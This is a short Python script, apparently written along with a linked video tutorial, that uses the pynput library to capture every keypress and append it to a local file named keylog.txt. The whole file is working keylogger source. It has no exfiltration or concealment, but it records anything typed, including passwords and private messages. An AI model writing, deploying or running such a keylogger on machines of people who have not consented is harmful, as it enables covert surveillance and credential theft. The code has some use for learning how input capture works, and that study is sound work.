from pynput import keyboard

def get_key(key):
    key_data = str(key)
    key_data = key_data.replace("'", "")
    with open('keylog.txt', 'a') as file:
        file.write(key_data)

with keyboard.Listener(on_press=get_key) as listen:
    listen.join()


# https://www.youtube.com/watch?v=WkE0QJu3ug8